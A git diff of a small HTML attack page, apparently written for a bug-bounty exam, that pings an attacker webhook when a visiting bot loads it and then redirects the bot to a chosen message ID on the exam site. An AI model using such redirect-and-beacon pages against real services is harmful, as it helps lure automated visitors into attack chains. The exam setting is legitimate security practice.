@@ -1,20 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head><title>Exploit</title></head>
 <body>
-    <h1 id="status">Initiating Redirect...</h1>
+    <h1>Processing...</h1>
     <script>
-        // 1. YOUR NEW ID GOES HERE
-        const messageId = "69e2a79ebee6d6b7c6629fad"; 
-        const targetUrl = "https://bugbounty-exam.hashacademy.co/view.php?id=" + messageId;
+        // REPLACE WITH YOUR LATEST MESSAGE ID
+        const id = "69e2a79ebee6d6b7c6629fad"; 
+        const webhook = "https://webhooksite.net/25f05aa1-8e17-4fef-a97f-3bb992e8bc01";
 
-        // Log the attempt to YOUR webhook so you know the redirect STARTED
-        fetch("https://webhooksite.net/25f05aa1-8e17-4fef-a97f-3bb992e8bc01/?status=redirecting_to_" + messageId);
+        // Step 1: Tell Webhook the bot is here
+        fetch(webhook + "/?step=1_bot_landed_on_github");
 
-        // Perform the redirect
+        // Step 2: Redirect to the exam site after a short delay
         setTimeout(() => {
-            window.location.replace(targetUrl);
-        }, 1000);
+            window.location.replace("https://bugbounty-exam.hashacademy.co/view.php?id=" + id);
+        }, 500);
     </script>
 </body>
 </html>
